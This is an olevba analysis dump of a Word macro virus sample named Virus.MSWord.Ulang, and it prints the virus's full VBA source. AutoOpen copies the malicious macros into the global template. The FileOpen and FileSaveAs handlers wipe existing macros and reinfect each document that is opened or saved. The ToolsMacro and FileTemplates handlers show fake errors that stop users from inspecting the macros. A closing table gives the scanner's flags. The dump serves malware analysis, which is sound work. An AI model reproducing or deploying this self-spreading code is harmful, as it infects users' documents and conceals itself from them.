olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651 - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.DisableAutoMacros
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim NFile$
Dim NMakro$
NFile$ = WordBasic.[FileName$]()
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy NMakro$, "Global:FileMacro"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651 - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
Dim TotalMacro
Dim i
Dim MN$
Dim FN$
Dim NFile$
Dim NMakro$
ReDim BadMacro__$(20)
WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo Akhir
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
TotalMacro = 0
For i = 1 To WordBasic.CountMacros(1)
    MN$ = WordBasic.[MacroName$](i, 1)
    BadMacro__$(i) = MN$
    TotalMacro = TotalMacro + 1
Next i
FN$ = WordBasic.[FileName$]()
If TotalMacro >= 1 Then
    For i = 1 To TotalMacro
        On Error GoTo -1: On Error GoTo Akhir
        WordBasic.Organizer Delete:=1, Source:=FN$, Name:=BadMacro__$(i), Tab:=3
    Next i
WordBasic.FileSave
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy "Global:FileMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", NMakro$
Akhir:
WordBasic.FileSave
WordBasic.DisableAutoMacros 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651 - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651 - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Anti Macro Virus"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
Dim Lakukan
Dim NFile$
Dim NMakro$
WordBasic.FileSave
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
Lakukan = WordBasic.Dialog.FileSaveAs(dlg)
If Lakukan Then
    dlg.Format = 1
    WordBasic.FileSaveAs dlg
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":AutoExec"
    WordBasic.MacroCopy "Global:AutoExec", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:AutoOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileOpen"
    WordBasic.MacroCopy "Global:FileOpen", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSave"
    WordBasic.MacroCopy "Global:FileSave", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileSaveAs"
    WordBasic.MacroCopy "Global:FileSaveAs", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileTemplates"
    WordBasic.MacroCopy "Global:FileTemplates", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":FileMacro"
    WordBasic.MacroCopy "Global:FileMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsMacro"
    WordBasic.MacroCopy "Global:ToolsMacro", NMakro$
    On Error GoTo -1: On Error GoTo Akhir
    NMakro$ = NFile$ + ":ToolsCustomize"
    WordBasic.MacroCopy "Global:ToolsCustomize", NMakro$
End If
Akhir:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651 - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Anti Macro Virus"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
Dim Pesan$
Pesan$ = "Template is not aveliable"
    WordBasic.MsgBox Pesan$, "Microsoft Word", 16
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileMacro.bas 
in file: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651 - OLE stream: 'Macros/VBA/FileMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651 - OLE stream: 'Macros/VBA/ToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From NdeKlaimber™ with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
Dim Pesan$
Pesan$ = "No such macro or command"
    WordBasic.MsgBox Pesan$, "NdeKlaimber Macro Err ##", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsCustomize.bas 
in file: Virus.MSWord.Ulang-e85d27aa8acb97a8c6be74b4d0d622511afed651 - OLE stream: 'Macros/VBA/ToolsCustomize'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
